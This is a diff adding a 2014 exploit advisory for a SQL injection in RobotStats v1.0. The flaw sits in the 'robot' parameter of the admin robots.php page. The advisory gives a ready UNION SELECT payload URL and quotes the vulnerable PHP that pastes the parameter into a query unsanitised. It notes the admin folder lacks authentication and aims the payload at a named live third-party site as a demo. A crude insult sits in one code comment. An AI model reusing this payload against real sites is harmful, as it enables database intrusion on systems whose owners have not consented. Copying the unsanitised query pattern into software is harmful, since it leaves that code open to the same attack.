@@ -1,0 +1,48 @@
+# Title         : RobotStats v1.0 (robot param) SQL Injection Vulnerability
+# Author        : ZoRLu / zorlu@milw00rm.com / submit@milw00rm.com
+# Home          : http://milw00rm.com / its online
+# Twitter	    : https://twitter.com/milw00rm or @milw00rm
+# Date          : 22.11.2014
+# Demo		    : http://alpesoiseaux.free.fr/robotstats/
+# Download 	    : http://www.robotstats.com/en/robotstats.zip
+# Thks          : exploit-db.com, packetstormsecurity.com, securityfocus.com, sebug.net and others
+# Birkaciyiadam : Dr.Ly0n, KnocKout, LifeSteaLeR, Nicx (harf sirali :)) )
+
+sql inj.:
+
+target.com/robotstats/admin/robots.php?rub=modif&robot=0x90+union+select+1,2,3,4,5,database(),7,8,9,10
+
+you look other files for sql example (/robotstats/info-robot.php?robot=?)
+
+analysis: (/admin/robots.php)
+
+no security for admin folder (session control, login panel or anyone... maybe its different vulnerability)
+
+include "robots.lib.php"; //line 26
+
+else if ($rub == "modif")
+{
+  formulaireRobot($robot); //line 44  (we will be analysis to robots.lib.php for line)
+}
+
+analysis: (/admin/robots.lib.php)
+
+function formulaireRobot($robot)  //line 71 (remember function line 44 in robots.php)
+{
+  global $RS_LANG, $RS_LANGUE, $RS_TABLE_ROBOTS, $RS_DETECTION_USER_AGENT, $RS_DETECTION_IP;
+
+  if ($robot != -1)
+  {
+    $title = $RS_LANG["ModifyRobot"];
+    $sql  = "SELECT *";
+    $sql .= " FROM ".$RS_TABLE_ROBOTS;
+    $sql .= " WHERE id=".$robot;  // line 80  (ver yansin amuga goyum!!!)
+    $res  = mysql_query($sql) or erreurServeurMySQL($sql);
+    $enr  = mysql_fetch_array($res);
+    $rub  = "modif";
+    $actif = $enr["actif"];
+  } //line 85
+
+for demo:
+
+http://alpesoiseaux.free.fr/robotstats/admin/robots.php?rub=modif&robot=0x90+union+select+1,2,3,4,5,database(),7,8,9,10
